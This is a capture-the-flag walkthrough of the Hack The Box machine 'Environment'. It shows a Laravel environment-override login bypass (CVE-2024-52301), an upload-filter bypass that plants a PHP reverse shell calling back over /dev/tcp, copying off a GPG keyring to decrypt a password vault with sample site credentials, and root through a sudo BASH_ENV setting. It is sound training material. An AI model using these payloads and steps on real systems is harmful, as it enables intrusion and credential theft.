- - - 
created : 05-09-2025 

Tags : #medium  

Released on 03 May 2025 (Season 8)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ rustscan -a environment.htb -- -A

Open 10.10.11.67:22
Open 10.10.11.67:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
```
# Enumeration
## HTTP (80)
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target:

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://environment.htb/ 

/login                (Status: 200) [Size: 2391]
/upload               (Status: 405) [Size: 244852]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/up                   (Status: 200) [Size: 2125]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
/build                (Status: 301) [Size: 169] [--> http://environment.htb/build/]
/mailing              (Status: 405) [Size: 244854]
```

![Pasted image 20250905124658.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250905124658.png)  
-The server is running in debug mode: APP_DEBUG=true ;
-We're handed raw stack trace with real file paths, line numbers, and exception messages.

We have Laravel v11.30.0 and [php](../../../3%20-%20Tags/Programming%20Languages/php.md) v8.2.28.

Source code of the main page:

![Pasted image 20250905125258.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250905125258.png)

Interesting, the Laravel-powered web application, exposes a subscription form that lets users sign up with their email address.
# Exploit

We can find the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) on Google:
https://www.cybersecurity-help.cz/vdb/SB20241112127
[CVE-2024-52301](../../../3%20-%20Tags/CVEs/CVE-2024-52301.md)
  
Laravel, when determining the current `App::environment()`, looks at the `argv` array—which normally comes from CLI input. However, if:

```
php.ini has register_argc_argv = On 
PHP is running in a web server context (not CLI) 
And the HTTP request includes `?argv[]=--env=ENVNAME` 
```

Then Laravel would mistakenly parse that argv as if it were passed via the command line and override the environment with the attacker-controlled value—this is the mechanism of CVE-2024-52301.
## Environment-Based Auth Bypass

The preprod check is a hardcoded bypass—meant for local testing, never meant to reach production. If triggered, the app sidesteps all auth checks, fabricates a session, and grants admin access (user_id = 1)—no password, no verification. But here's the twist: we don't need access to Laravel's config files to change the environment.
  
if this target runs Laravel 11.30.0 and `register_argc_argv = On` (default in many setups), then we can test with an HTTP request like:

```http
HTTP POST /login?--env=preprod HTTP/1.1 
Host: environment.htb 
Content-Type: application/x-www-form-urlencoded 

_token=&email=mdn0x@environment.htb&password=hacked&remember=True
```
  
And Laravel gives a session and redirects us to /management/dashboard as the privileged user `Hish`, using [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md):

![Pasted image 20250905155605.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250905155605.png)

Replaying the request in browser:

![Pasted image 20250905160816.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250905160816.png)
## First Access 

Looking how the upload works, it’s checking for images only (by content and file extension), so we can try to bypassing this adding the image magic bytes at the top of our **.PHP** file and changing its extension.  
If we try to upload it, the file does indeed bypass the “image only” check, but going to the file’s URL, it doesn’t seems to be executing the revshell.  
After more attempts and paying more attention to how the upload function manipulates the file and generates the URL, we find that the extension that works is: **.php.**.  
Adding the final dot to the file extension will bypass completely the upload function and allow us to execute the [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md).

First we create the file with [Nano](../../../3%20-%20Tags/Hacking%20Tools/Nano.md):

```php
GIF89a
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.56/1337 0>&1'"); ?>
```

We setup a listener with [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and upload the shell, then go to the URL of the file:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Environment]
└─$ nc -lvnp 1337  
listening on [any] 1337 ...
connect to [10.10.14.56] from (UNKNOWN) [10.10.11.67] 45812
bash: cannot set terminal process group (834): Inappropriate ioctl for device
bash: no job control in this shell
www-data@environment:~/app/storage/app/public/files$ whoami
whoami
www-data
www-data@environment:~/app/storage/app/public/files$ cd /home
cd /home
www-data@environment:/home$ ls
ls
hish
www-data@environment:/home$ cd hish
cd hish
www-data@environment:/home/hish$ ls                     
ls
backup
exp.sh
user.txt
www-data@environment:/home/hish$ cat user.txt
cat user.txt
 {{REDACTED_FLAG}}
```

So we have access to the user flag in `/home/hish`.

We can perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) to work better.
# Privilege Escalation
## www-data to Hish

for [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md), we should start looking to the files we have in the user home directory. A particulary interesting directory is: **.gnupg**.  
This directory stores the cryptographic keys used to encrypt, sign and verify files, and if we check the **“backup”** directory, we would see an encrypted file.

After downloaded the **backup** file and the entire **.gnupg** directory we can start to attempt to decrypt the backup using gpg.

1.  We enter the backup folder, host a [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md) server and `wget` it from our machine:

```bash
www-data@environment:/home/hish/backup$ ls
keyvault.gpg
www-data@environment:/home/hish/backup$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.56 - - [06/Sep/2025 00:39:12] "GET /keyvault.gpg HTTP/1.1" 200 -
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Environment]
└─$ wget http://environment.htb:8000/keyvault.gpg
--2025-09-05 16:39:08--  http://environment.htb:8000/keyvault.gpg
Risoluzione di environment.htb (environment.htb)... 10.10.11.67
Connessione a environment.htb (environment.htb)|10.10.11.67|:8000... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 430 [application/octet-stream]
Salvataggio in: «keyvault.gpg»

keyvault.gpg             100%[==================================>]     430  --.-KB/s    in 0s      

2025-09-05 16:39:08 (22,6 MB/s) - «keyvault.gpg» salvato [430/430]
```

2. Now we need to compress the directory and do the same process:

```bash
www-data@environment:/home/hish$ tar -czf /tmp/gnupg /home/hish/.gnupg/
tar: Removing leading `/ from member names
www-data@environment:/home/hish$ ls /tmp
gnupg
www-data@environment:/home/hish$ cd /tmp
www-data@environment:/tmp$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Environment]
└─$ wget http://environment.htb:8080/gnupg
--2025-09-05 16:48:11--  http://environment.htb:8080/gnupg
Risoluzione di environment.htb (environment.htb)... 10.10.11.67
Connessione a environment.htb (environment.htb)|10.10.11.67|:8080... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 6115 (6,0K) [application/octet-stream]
Salvataggio in: «gnupg»

gnupg                    100%[==================================>]   5,97K  --.-KB/s    in 0s  

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Environment]
└─$ ls
gnupg  keyvault.gpg  shell.php.  user.txt
```

Now we can extract:

```bash
tar -xzf gnupg 
```

3. We need to decrypt the backup using `gpg`:

```bash
gpg --homedir ./gnupg --list-keys
gpg --homedir ./gnupg --list-secret-keys
gpg --homedir ./gnupg --export-secret-keys -a > private_key.asc
gpg --import private_key.asc

## Final step
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Environment/home/hish]
└─$ gpg --decrypt gnupg/keyvault.gpg 
gpg: crittografato con rsa2048 chiave, ID B755B0EDD6CFCFD3, creato 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> {{REDACTED_PASSWD}}
FACEBOOK.COM -> summerSunnyB3ACH!!
```
### SSH

We can access [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with the found password:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Environment/home/hish]
└─$ ssh hish@environment.htb    
password:

hish@environment:~$ ls
backup  exp.sh  user.txt
hish@environment:~$ cat exp.sh 
bash -p
hish@environment:~$ 
```
## Hish to Root

We check for sudo privileges:

```bash
hish@environment:/$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV
    BASH_ENV", use_pty

User hish may run the following commands on environment:
  (ALL) /usr/bin/systeminfo

hish@environment:/$ cat /usr/bin/systeminfo
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```

This script has a vulnerability because it doesn’t use the absolute paths for the commands. This vulnerability is known as [PATH hijacking](../../../3%20-%20Tags/Hacking%20Concepts/PATH%20hijacking.md).

To exploit this vulnerability we can simply create a file with the exact same name as one of the commands used in the script and change the **PATH** environment variable to point to the directory which have our malicious file.

However, if we try to execute the **systeminfo** script still doesn’t give us a root shell. That’s because, as shown in the **sudo -l** output, sudo resets the PATH. But there is one environment variable we can keep: **“BASH_ENV”**:

```bash
echo '/bin/bash' > /tmp/root.sh
chmod +x /tmp/root.sh
export BASH_ENV=/tmp/root.sh
sudo /usr/bin/systeminfo
```

```bash
hish@environment:/tmp/.tmp$ sudo /usr/bin/systeminfo
root@environment:/tmp/.tmp# cat /root/root.txt
 {{REDACTED_FLAG}}
```

Pwned !!



